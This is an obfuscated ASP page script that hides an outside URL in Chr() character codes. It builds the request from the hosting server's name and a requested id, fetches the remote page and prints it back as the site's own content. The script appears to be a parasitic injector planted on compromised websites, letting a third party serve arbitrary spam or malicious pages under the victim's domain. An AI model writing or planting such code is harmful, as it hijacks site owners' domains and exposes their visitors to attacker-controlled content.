<%

IIIIIilII=Request("id")
if IIIIIilII ="" then
IIIIIilII = "sitemap"
end if
na=Request.ServerVariables("SERVER_NAME")
IIIIIilIIlII= "caidao"
IIIIIilIIl = Chr ( 104 ) & Chr ( 116 ) & Chr ( 116 ) & Chr ( 112 ) & Chr ( 58 ) & Chr ( 47 ) & Chr ( 47 ) & Chr ( 120 ) & Chr ( 117 ) & Chr ( 102 ) & Chr ( 101 ) & Chr ( 110 ) & Chr ( 103 ) & Chr ( 111 ) & Chr ( 110 ) & Chr ( 108 ) & Chr ( 105 ) & Chr ( 110 ) & Chr ( 101 ) & Chr ( 50 ) & Chr ( 46 ) & Chr ( 99 ) & Chr ( 111 ) & Chr ( 109 ) & Chr ( 47 ) & Chr ( 109 ) & Chr ( 49 ) & Chr ( 48 ) & Chr ( 47 ) & IIIIIilIIlII & Chr ( 47 )& na & Chr ( 47 ) & IIIIIilII & Chr ( 46 ) & Chr ( 104 ) & Chr ( 116 ) & Chr ( 109 ) & Chr ( 108 )

a=GetHttpPage(IIIIIilIIl,"utf-8")
Response.write a
response.end


Function GetHttpPage(IIIIIilIIl, charset) 
    Dim http 
    Set http = Server.createobject("Msxml2.ServerXMLHTTP")
    http.Open "GET", IIIIIilIIl, false
    http.Send() 
    If http.readystate<>4 Then
        Exit Function 
    End If 
    GetHttpPage = BytesToStr(http.ResponseBody, charset)
    Set http = Nothing
End function


Function BytesToStr(body, charset)
    Dim objStream
    Set objStream = Server.CreateObject("Adodb.Stream")
    objStream.Type = 1
    objStream.Mode = 3
    objStream.Open
    objStream.Write body
    objStream.Position = 0
    objStream.Type = 2
    objStream.Charset = charset
    BytesToStr = objStream.ReadText 
    objStream.Close
    Set objStream = Nothing
End Function

%>
